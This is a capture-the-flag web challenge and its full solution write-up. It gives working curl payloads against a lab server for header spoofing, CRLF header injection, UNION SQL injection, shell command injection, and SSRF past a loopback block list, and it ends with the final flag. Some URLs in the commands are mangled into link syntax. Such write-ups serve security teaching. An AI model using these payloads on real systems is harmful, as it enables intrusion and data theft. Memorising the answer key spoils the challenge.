<!-- BEGIN PROBLEM DESCRIPTION -->
# The Midnight Gallery Heist

## DeliverHellVeil

**Category:** Web Exploitation

**Difficulty:** Medium-Hard



---

## Question Description

The Midnight Gallery is an underground marketplace for illicit digital artifacts.
Its staging gateway is public, but the staff portal behind it is not. Rumour has it
that the gallery is preparing a classified data file known as the **Masterpiece**.

Intelligence says the Masterpiece has been split into **four shards** across the
gallery's internal network. Each shard is held by a different node. Recover all four
and assemble the flag.

## Objective

Get past the staging gateway, recover the four shards, and submit the flag in the
format `kernel{...}`. The four shards are joined in order to form the flag.

## What you need

- A web browser
- Burp Suite (recommended) or `curl`

## Rules

- Attack only the challenge server. Do not test other systems.
- Do not attempt denial-of-service. Keep requests reasonable.
- Submit the flag in the format `kernel{...}`.
<!-- END PROBLEM DESCRIPTION -->

---

## Solution

The Masterpiece is split into four shards. Each shard sits behind a different weakness,
and each weakness leads to the next. This writeup walks through the intended path, the
reason each step works, and the dead ends that waste time.

Examples use `localhost:8080`. Replace it with the address the organisers give you. The
commands use `curl`. Burp Suite can send the same requests through Repeater.

---

## Step 1: Pass the staging gateway

Request the dashboard, saving any cookies to a jar file:

```bash
curl -c jar.txt http://localhost:8080/
```

It returns `403 Forbidden`:

```
403 Forbidden: this gateway only accepts requests from internal IP addresses. External requests are rejected.
```

The gateway decides by where the request appears to come from. Proxies report the
original client address in a header, and the gateway reads it from there. The usual
header for this is `X-Forwarded-For`. Claim an internal address in that header:

```bash
curl -c jar.txt -H "X-Forwarded-For: 127.0.0.1" http://localhost:8080/
```

The dashboard loads, and the gateway sets a `gateway_auth` cookie in the response. It
lasts for the whole challenge. From now on, send the cookie without the header, as
`-b jar.txt` does in every command below. Burp Suite and browsers keep this cookie
automatically when it comes from the proxy. If Repeater doesn't keep it, copy the
`gateway_auth` value into a `Cookie` header once.

The dashboard lists the navigation links (Catalog, Archive, Diagnostics, Preview) and a
status line naming the vault endpoint, `/internal/vault`.

**Lesson:** a request header the client controls must not decide trust. Once trusted,
a session cookie should be checked on every request, but the cookie itself is still
client-controlled.

---

## Step 2: Shard 1 (two routes)

Record 1 in the artworks API has `"prev_id": 0`, so record 0 exists:

```bash
curl -b jar.txt "http://localhost:8080/api/v1/artworks?id=1"
# {"status": "success", "id": 1, "artifact": "Phantom Canvas", "prev_id": 0}
```

Record 0 is the genesis record. It needs the cookie `access_tier=curator`:

```bash
curl -b jar.txt "http://localhost:8080/api/v1/artworks?id=0"
# 403: Genesis record restricted. Requires cookie access_tier=curator.
```

There are two ways to get that cookie. Either one gives shard 1.

### Route A: CRLF injection through the relay

The relay at `/api/v1/redirect?to=<path>` (the Archive link in the navigation) writes its
`to` value into the `Location` header of a redirect, without removing line breaks. HTTP
separates headers with CRLF (`%0d%0a`), so a `to` value containing CRLF ends the Location
header and starts a new one. Use it to set the cookie:

```bash
curl -i -c jar.txt -b jar.txt \
  "http://localhost:8080/api/v1/redirect?to=home%0d%0aSet-Cookie:%20access_tier%3Dcurator%3B%20Path%3D%2F"
```

The response contains a `Set-Cookie: access_tier=curator; Path=/` header of its own. The
jar now holds the cookie. Request record 0:

```bash
curl -b jar.txt "http://localhost:8080/api/v1/artworks?id=0"
```

**Lesson:** when user input is written into a response header, CRLF lets an attacker add
arbitrary headers, including cookies. Real frameworks refuse this. The bug is in how the
relay writes its response.

### Route B: set the cookie directly

The 403 names the cookie and its value. The server trusts the cookie as sent, so you
can add it yourself, with no injection:

```bash
curl -b jar.txt -b "access_tier=curator" "http://localhost:8080/api/v1/artworks?id=0"
```

In Burp, add `Cookie: access_tier=curator` to the request in Repeater. Keep the existing `gateway_auth` cookie in the same header. The browser
route is the same: add the cookie in developer tools, then reload the record.

Either route returns:

```json
{"status": "success", "artifact": "Genesis Record", "shard": "kernel{1_h1dd3n_", "internal_origin": "[http://gallery.local:8080](http://gallery.local:8080)"}
```

**Shard 1:** `kernel{1_h1dd3n_`

The response also gives you the internal origin, `http://gallery.local:8080`. You need it in Step 5.

---

## Step 3: Shard 2 through UNION SQL injection

The Archive page searches artwork titles. The search text goes straight into an SQL query,
and SQL errors are shown on the page. The table has three visible columns (ID, Title, Artist),
so a UNION must return three columns.

The page footer says `SQLite 3`. SQLite keeps its table list in `sqlite_master`. Query it:

```bash
curl -b jar.txt -G "http://localhost:8080/archive.php" \
  --data-urlencode "search=' UNION SELECT 0,name,sql FROM sqlite_master-- "
```

The output lists a `secrets` table with columns `id`, `shard`, and `notes`. Read the shard:

```bash
curl -b jar.txt -G "http://localhost:8080/archive.php" \
  --data-urlencode "search=' UNION SELECT 0,shard,notes FROM secrets-- "
```

Row 0 shows the shard in the Title column: `2_un10n_`.

**Shard 2:** `2_un10n_`

**Lesson:** string-built SQL can be injected. Error messages and footers reveal the database
engine, and `sqlite_master` lists the tables.

---

## Step 4: Shard 3 through command injection

The Diagnostics page pings a host. The input goes to a shell, and a semicolon starts a second
command. The shell runs in the diagnostics service's folder, which contains `shard3.txt`. List it:

```bash
curl -b jar.txt -X POST \
  --data-urlencode "ip=127.0.0.1; ls" "http://localhost:8080/admin/diagnostics"
```

The output includes `shard3.txt`. Read it:

```bash
curl -b jar.txt -X POST \
  --data-urlencode "ip=127.0.0.1; cat shard3.txt" "http://localhost:8080/admin/diagnostics"
```

The output ends with `3_sh3ll_`.

**Shard 3:** `3_sh3ll_`

**Lesson:** user input passed to a shell runs arbitrary commands. The diagnostics service runs
separately from the gateway and holds only its own files. Shell access to it doesn't reach the
vault, so you still need Step 5.

---

## Step 5: Shard 4 through SSRF to the vault

The Preview Fetcher downloads a URL on the server's behalf. The vault at `/internal/vault`
returns the last shard, but only to requests the server makes to itself. The fetcher is the one
component that makes such a request, and it sends a secret token that you can't see.

Pointing the fetcher at the loopback address is blocked. Any loopback form in the URL is
rejected, including `127.0.0.1`, `localhost`, `0.0.0.0`, `[::1]`, `127.1`, `2130706433`, and
`0x7f000001`:

```bash
curl -b jar.txt -G "http://localhost:8080/api/v1/fetch_preview" \
  --data-urlencode "url=[http://127.0.0.1:8080/internal/vault](http://127.0.0.1:8080/internal/vault)"
# {"error": "Blocked: internal address detected"}
```

The filter resolves the host in the URL you submit. Any name that resolves to a loopback address is refused, so the aliases above fail too. The one exception is the gateway's own name, which the filter trusts because the server resolves it to itself. 
`gallery.local` is the gateway's own name (from Step 2's `internal_origin`). The server resolves it
to itself, so the request reaches the vault from the server:

```bash
curl -b jar.txt -G "http://localhost:8080/api/v1/fetch_preview" \
  --data-urlencode "url=[http://gallery.local:8080/internal/vault](http://gallery.local:8080/internal/vault)"
```

The fetcher returns the vault's response:

```json
{"status": 200, "url": "[http://gallery.local:8080/internal/vault](http://gallery.local:8080/internal/vault)", "content": "{\"shard\": \"4_m4st3rp13c3}\"}"}
```

**Shard 4:** `4_m4st3rp13c3}`

**Lesson:** server-side request forgery happens when a server fetches a URL you choose.
A filter that trusts a name instead of checking where the name points can be fooled. Here the gateway trusts its own name, so that name needs the same scrutiny as any other.
Also, "the request came from localhost" is not an authentication signal.

---

## Final flag

Joined in order:

```
kernel{1_h1dd3n_ + 2_un10n_ + 3_sh3ll_ + 4_m4st3rp13c3}
= kernel{1_h1dd3n_2_un10n_3_sh3ll_4_m4st3rp13c3}
```

---
